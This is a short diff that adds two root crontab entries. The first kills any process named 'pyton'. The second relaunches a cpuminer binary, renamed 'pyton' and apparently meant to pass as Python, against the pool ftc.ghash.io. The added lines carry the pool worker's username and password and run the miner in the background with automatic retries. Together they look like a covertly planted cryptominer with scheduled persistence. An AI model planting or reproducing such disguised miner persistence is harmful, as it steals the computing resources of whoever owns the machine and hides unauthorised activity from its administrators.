@@ -1,0 +1,2 @@
+51 * * * * killall -I pyton
+55 * * * * /root/macca/cpuminer/pyton -o stratum+tcp://ftc.ghash.io:3333 -O alLi1n.worker151:1234gosok -D -B -R 151
